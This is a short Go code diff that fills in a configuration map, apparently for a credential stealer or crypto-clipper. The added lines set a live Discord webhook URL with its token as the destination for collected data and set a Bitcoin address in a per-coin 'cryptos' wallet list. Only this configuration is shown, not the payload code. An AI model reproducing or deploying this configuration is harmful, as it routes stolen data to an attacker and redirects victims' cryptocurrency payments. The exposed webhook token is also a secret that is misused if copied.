@@ -23,9 +23,9 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://discord.com/api/webhooks/1360781629852881126/lxeNjRiVwT6vMphZF8Yhgs7WXr5dnmejJ0-M61BJGFIIc6bsZMWi6Rbv7BR66zr8XIeC",
 		"cryptos": map[string]string{
-			"BTC": "",
+			"BTC": "bc1qp7ljt8a2uw7zkfte2f35nwhzml0s5fl0xs5h5a",
 			"BCH": "",
 			"ETH": "",
 			"XMR": "",
